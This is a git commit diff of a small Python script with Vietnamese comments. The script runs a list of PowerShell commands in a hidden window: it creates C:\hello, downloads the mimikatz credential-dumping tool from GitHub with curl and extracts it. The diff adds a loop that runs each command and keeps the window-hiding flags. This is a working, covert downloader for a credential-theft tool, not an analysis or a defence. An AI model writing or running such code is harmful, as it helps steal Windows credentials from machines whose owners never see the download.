28577ade0668349c965f37868857f2f4b5a8a2a5
unknown <vuthai010705@gmail.com>
2026-05-25 22:21:39 +0700

    dcmmmm

--- code.py
+++ code.py
@@ -1,22 +1,28 @@
 import subprocess
 
-#powershell command to execute
 COMMANDS = [
     r'mkdir C:\hello',
     r'curl.exe -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o C:\hello\hello.zip',
     r'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/unzipped"',
 ]
 
+def run_powershell(command: str) -> int:
+    kwargs = {"capture_output": True, "text": True}
+    
+    # CREATE_NO_WINDOW chỉ dùng trên Windows
+    import platform
+    if platform.system() == "Windows":
+        kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
 
-def run_powershell(command: str):
     result = subprocess.run(
         ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command],
-        capture_output=True,
-        text=True,
-        creationflags=subprocess.CREATE_NO_WINDOW  # hide CMD
-    )
+        **kwargs
+    ) 
     return result.returncode
- 
- 
+
+
 if __name__ == "__main__":
-    run_powershell(COMMAND)
+    for cmd in COMMANDS:
+        if run_powershell(cmd) != 0:
+            print("Dừng lại do lỗi.")
+            break
